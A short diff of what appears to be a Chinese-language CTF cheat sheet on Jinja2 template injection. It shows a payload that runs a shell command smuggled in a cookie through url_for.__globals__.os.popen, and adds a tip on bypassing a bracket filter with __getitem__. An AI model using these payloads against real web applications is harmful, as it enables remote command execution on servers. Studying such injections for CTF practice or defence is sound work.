@@ -196,5 +196,9 @@ a=os;b=popen;c=cat /flag
 # cookie 可以使用
 ?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}
 Cookie:c=cat /flag
+
+
+过滤了[]
+用__getitem__(下标)
 ```
 
